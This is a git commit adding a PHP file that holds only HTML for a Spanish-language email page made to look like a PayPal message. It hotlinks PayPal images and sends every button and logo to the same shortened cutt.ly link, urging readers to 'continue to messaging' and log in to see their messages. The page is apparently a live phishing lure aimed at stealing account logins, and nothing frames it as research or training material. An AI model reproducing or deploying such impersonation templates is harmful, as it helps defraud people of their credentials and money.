c5e296861a64cee1393b36771e67476f11274a02
hetyti <103523443+hetyti@users.noreply.github.com>
2022-04-12 18:36:54 +0200

    Add files via upload

---
+++ redirectiones.php
@@ -0,0 +1,97 @@
+<p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p>
+<p align="center"><a href="https://cutt.ly/Moid5OS"><img src="https://i.imgur.com/eYEWoro.png" alt="" width="324" height="87" align="baseline" border="0" hspace="0" /></a></p>
+<p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p>
+<p align="center">&nbsp;</p>
+<table class="ox-1b992947a2-mobile_button" style="height: 72px; width: 542px; border-collapse: collapse; color: #292929; font: 13px Arial, Verdana, Helvetica, sans-serif; font-stretch: normal; font-size-adjust: none; border-width: 0px;" border="0" cellspacing="0" cellpadding="0" align="center">
+<tbody>
+<tr>
+<td id="ox-1b992947a2-force_height" style="padding: 0px;" width="1" height="30"><a href="https://cutt.ly/Moid5OS"><span style="color: #ffffff;"><img style="max-width: 10000px; vertical-align: middle; display: block;" src="https://www.paypalobjects.com/webstatic/eCAT/GCE/spacer10.gif" width="1" height="30" border="0" /></span></a></td>
+<td class="ox-1b992947a2-button_style" style="font-size: 1em; font-family: HelveticaNeueLight, HelveticaNeue-Light, 'Helvetica Neue Light', HelveticaNeue, Helvetica, Arial, sans-serif; background: #0079c1; font-weight: 300; color: #ffffff; text-align: center; margin: 0px auto 16px; line-height: 1.45em; font-stretch: normal; padding: 7px 15px 7px 15px;" align="left" valign="middle" width="536"><span style="font-size: 13px; text-decoration: none; font-family: Arial, sans-serif; font-weight: bold; color: #ffffff; display: block; line-height: 15px;"><a href="https://cutt.ly/Moid5OS"><span style="color: #ffffff; font-size: x-large;">Continuar con la mensajer&iacute;a..</span></a></span></td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<table style="font-size: 13px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; white-space: normal; word-spacing: 0px; border-collapse: collapse; text-transform: none; font-weight: 400; color: #000000; font-style: normal; orphans: 2; widows: 2; letter-spacing: normal; line-height: normal; text-indent: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-style: initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; -webkit-font-smoothing: antialiased; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; border-width: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td style="white-space: normal !important; -webkit-font-smoothing: antialiased; padding: 0px 30px 30px 30px;" align="center">
+<table style="font-family: inherit; border-collapse: collapse; line-height: normal; -webkit-font-smoothing: antialiased; font-stretch: inherit; border-width: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td class="x_ox-854c97f84b-ppsans" style="font-size: 19px; font-family: Calibri, Trebuchet, Arial, 'sans serif'; vertical-align: top; white-space: normal !important; color: #009cde; line-height: 24px; -webkit-font-smoothing: antialiased; padding: 0px;" align="center">
+<p>&nbsp;</p>
+<p><span style="font-size: xx-large;"><strong> Aqu&iacute; le mostramos c&oacute;mo revisar sus mensajes.</strong></span></p>
+<p>&nbsp;</p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+<table style="font-size: 13px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; white-space: normal; word-spacing: 0px; border-collapse: collapse; text-transform: none; font-weight: 400; color: #000000; font-style: normal; orphans: 2; widows: 2; letter-spacing: normal; line-height: normal; text-indent: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-decoration-style: initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; -webkit-font-smoothing: antialiased; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; border-width: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td style="white-space: normal !important; -webkit-font-smoothing: antialiased; padding: 0px 30px 30px 30px;" align="center">
+<table class="x_ox-854c97f84b-stackTbl" style="font-family: inherit; border-collapse: collapse; line-height: normal; -webkit-font-smoothing: antialiased; font-stretch: inherit; border-width: 0px;" border="0" width="30%" cellspacing="0" cellpadding="0" align="left">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td style="white-space: normal !important; -webkit-font-smoothing: antialiased; padding: 0px;" valign="top">
+<table style="font-family: inherit; border-collapse: collapse; line-height: normal; -webkit-font-smoothing: antialiased; font-stretch: inherit; border-width: 0px;" border="0" cellspacing="0" cellpadding="0" align="center">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td style="white-space: normal !important; -webkit-font-smoothing: antialiased; padding: 0px;" align="center" valign="top">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<table class="x_ox-854c97f84b-stackTbl" style="height: 207px; font-family: inherit; width: 364px; border-collapse: collapse; line-height: normal; -webkit-font-smoothing: antialiased; font-stretch: inherit; border-width: 0px;" border="0" width="364" cellspacing="0" cellpadding="0" align="center">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td class="x_ox-854c97f84b-topPadding10" style="white-space: normal !important; -webkit-font-smoothing: antialiased; padding: 0px;" valign="top">
+<table style="font-family: inherit; border-collapse: collapse; line-height: normal; -webkit-font-smoothing: antialiased; font-stretch: inherit; border-width: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td class="x_ox-854c97f84b-ppsans" style="font-size: 17px; font-family: Calibri, Trebuchet, Arial, 'sans serif'; white-space: normal !important; color: #333333; line-height: 22px; -webkit-font-smoothing: antialiased; padding: 0px;" valign="top">
+<table style="height: 413px; font-family: inherit; width: 637px; border-collapse: collapse; line-height: normal; -webkit-font-smoothing: antialiased; font-stretch: inherit; border-width: 0px;" border="0" width="637" cellspacing="0" cellpadding="0" align="center">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td style="white-space: normal !important; -webkit-font-smoothing: antialiased; padding: 0px 0px 30px 0px;" align="center">
+<table style="font-family: inherit; border-collapse: collapse; line-height: normal; -webkit-font-smoothing: antialiased; font-stretch: inherit; border-width: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
+<tbody style="-webkit-font-smoothing: antialiased;">
+<tr style="-webkit-font-smoothing: antialiased;">
+<td class="x_ox-854c97f84b-ppsans" style="font-size: 17px; font-family: Calibri, Trebuchet, Arial, 'sans serif'; white-space: normal !important; color: #333333; line-height: 22px; -webkit-font-smoothing: antialiased; padding: 0px;" valign="top">
+<p style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0px 0px 1em; -webkit-font-smoothing: antialiased;">1. Inicia sesi&oacute;n.<br style="-webkit-font-smoothing: antialiased;" /> 2. Haga clic en<strong style="-webkit-font-smoothing: antialiased;"> Notificaciones</strong><span style="vertical-align: baseline; margin: 0px; -webkit-font-smoothing: antialiased; border-width: 0px; padding: 0px;">&nbsp;</span>parte superior de la p&aacute;gina.<br style="-webkit-font-smoothing: antialiased;" />3. Haga clic en<span style="vertical-align: baseline; margin: 0px; -webkit-font-smoothing: antialiased; border-width: 0px; padding: 0px;">&nbsp;</span><strong style="-webkit-font-smoothing: antialiased;"> seguir</strong>.<br style="-webkit-font-smoothing: antialiased;" />4. Haga clic en<span style="vertical-align: baseline; margin: 0px; -webkit-font-smoothing: antialiased; border-width: 0px; padding: 0px;">&nbsp;</span><strong style="-webkit-font-smoothing: antialiased;"> Mostrar mensajes</strong>.<br style="-webkit-font-smoothing: antialiased;" />5. Haga clic en el mensaje para mostrarlo.</p>
+<p style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0px 0px 1em; -webkit-font-smoothing: antialiased;">Los mensajes est&aacute;n disponibles durante 15 d&iacute;as..</p>
+</td>
+</tr>
+</tbody>
+</table>
+<p align="center"><img src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/w100/glyph_handmobilephone_blue.png" alt="" width="124" height="97" align="baseline" border="0" hspace="0" /><img src="https://www.paypalobjects.com/digitalassets/c/system-triggered-email/w100/glyph_lock_blue.png" alt="" align="baseline" border="0" hspace="0" /></p>
+<p align="center">&nbsp;</p>
+<p align="center"><span style="font-family: System; font-size: large;"><strong>Copyright - 1999-2020 Europe Finance and Economic Services.</strong></span></p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
